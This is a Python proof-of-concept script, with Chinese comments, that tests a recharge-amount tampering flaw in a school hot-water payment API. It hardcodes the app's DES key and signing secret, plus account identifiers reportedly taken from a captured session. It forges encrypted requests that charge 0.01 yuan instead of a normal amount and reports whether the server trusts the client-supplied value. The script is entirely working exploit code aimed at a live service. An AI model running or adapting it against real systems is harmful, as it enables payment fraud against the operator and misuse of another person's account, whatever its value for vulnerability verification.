#!/usr/bin/env python3
"""
验证脚本: HotWaterRecharge2 金额篡改漏洞
使用已知密钥构造篡改请求，对比服务端返回的 CurrentRechargeMoney
"""
import hashlib, json, time, random, sys
import urllib.request, urllib.error
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad, unpad

KEY = IV = b'a1@998#.'
URL = "http://schoolv3and.denengny.com/Student/HotWaterRecharge2"

# 从 HAR 中提取的真实账号数据
QR_DATA = "55D502F70100256ED37156B9E19A76DBD0841614"
USI_ID  = 356411
SI_ID   = 32

def des_encrypt(s: str) -> str:
    return DES.new(KEY, DES.MODE_CBC, IV).encrypt(pad(s.encode(), 8)).hex().upper()

def des_decrypt(h: str) -> dict:
    raw = bytes.fromhex(h.strip())
    return json.loads(unpad(DES.new(KEY, DES.MODE_CBC, IV).decrypt(raw), 8).decode())

def make_sign(ts: str) -> str:
    return hashlib.md5((ts + 'a1@998#.').encode()).hexdigest().lower()

def send_request(money: int) -> dict:
    ts = time.strftime('%Y%m%d%H%M%S') + str(random.randint(10, 99))
    payload = {
        "qrCodeData":    QR_DATA,
        "USI_Id":        USI_ID,
        "SI_Id":         SI_ID,
        "RechargeMoney": money,
        "ver":           "Android-1.0.32",
        "timestamp":     ts,
        "sign":          make_sign(ts)
    }
    body = des_encrypt(json.dumps(payload, ensure_ascii=False)).encode()

    req = urllib.request.Request(
        URL,
        data=body,
        headers={
            "Accept":           "*/*",
            "Content-Type":     "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent":       "okhttp/3.3.1",
            "Host":             "schoolv3and.denengny.com",
            "Accept-Encoding":  "identity",
        },
        method="POST"
    )

    print(f"\n[>] POST {URL}")
    print(f"[>] 明文请求: RechargeMoney={money} ({money/100:.2f} 元)")
    print(f"[>] 加密请求体: {body[:40].decode()}...")

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            raw_resp = resp.read().decode()
            print(f"[<] HTTP {resp.status}")
            print(f"[<] 加密响应: {raw_resp[:60]}...")
            result = des_decrypt(raw_resp)
            print(f"[<] 解密响应: {json.dumps(result, indent=2, ensure_ascii=False)}")
            return result
    except urllib.error.URLError as e:
        print(f"[!] 请求失败: {e}")
        sys.exit(1)

def main():
    print("=" * 60)
    print("  金额篡改漏洞验证")
    print("=" * 60)

    # 测试 1: 极低金额 1 分（0.01元），远低于正常最小充值额
    print("\n[测试1] 发送 RechargeMoney=1 (0.01元)")
    r1 = send_request(money=1)
    money1 = r1.get('data', {}).get('CurrentRechargeMoney', 'N/A') if r1.get('code') == 1 else None

    # 等待一秒再发第二个
    time.sleep(2)

    # 测试 2: 正常金额 2500 分（25元），作为对照组
    print("\n[测试2] 对照: 发送 RechargeMoney=2500 (25.00元)")
    r2 = send_request(money=2500)
    money2 = r2.get('data', {}).get('CurrentRechargeMoney', 'N/A') if r2.get('code') == 1 else None

    # 结论
    print("\n" + "=" * 60)
    print("  验证结论")
    print("=" * 60)

    if r1.get('code') == 1 and money1 is not None:
        print(f"[VULN] 服务端接受 RechargeMoney=1, 返回 CurrentRechargeMoney={money1}")
        print(f"       服务端完全信任客户端传入的金额，漏洞存在。")
    elif r1.get('code') != 1:
        print(f"[INFO] 服务端拒绝 RechargeMoney=1: {r1.get('message')}")
        print(f"       服务端可能有最小金额校验或 qrCodeData 已过期。")
    else:
        print(f"[INFO] qrCodeData 可能已过期，无法从此次测试得出结论。")

    if r2.get('code') == 1:
        print(f"[INFO] 对照组正常: RechargeMoney=2500 -> CurrentRechargeMoney={money2}")
    else:
        print(f"[WARN] 对照组也失败: {r2.get('message')} — qrCodeData 可能已过期")

if __name__ == "__main__":
    main()
